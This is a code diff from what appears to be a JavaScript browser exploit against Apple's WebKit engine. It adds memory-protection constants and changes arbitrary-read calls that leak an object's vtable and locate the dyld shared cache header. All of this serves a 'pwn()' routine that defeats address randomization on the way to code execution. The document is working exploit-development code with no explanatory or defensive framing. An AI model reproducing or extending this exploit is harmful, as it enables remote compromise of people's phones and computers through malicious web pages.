@@ -384,6 +384,12 @@ var qwordAsFloat = qword => {
     //data_view.setBigUint64(0, qword);
     return data_view.getFloat64(0, true);
 }
+var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;
+var VM_PROT_NONE = 0x0
+var VM_PROT_READ = 0x1
+var VM_PROT_WRITE = 0x2
+var VM_PROT_EXECUTE = 0x4
+
 // constant added to double JSValues
           const kBoxedDoubleOffset = 0x0002000000000000n;
           function boxDouble(d) {
@@ -624,9 +630,11 @@ var qwordAsFloat = qword => {
         //alert(FPO)
         let exe_ptr = memory.read_i64(Add(ad_div, FPO),0);
         log('[+] Executable instance is at '+exe_ptr.toString(16));
-        let v_tlb = memory.read_i64(exe_ptr,0);
+        let v_tlb = memory.read_i64(exe_ptr);
         log('[+] divelement vtable seems to be at '+v_tlb.toString(16));
-        var anchor = memory.read_i64(v_tlb,0)
+        var anchor = memory.read_i64(v_tlb)
+        var hdr = Sub(anchor, anchor.lo() & 0xfff);
+        log('dyld cache header @' + hdr); //dyld_cache_header
               
           }
           function pwn() {
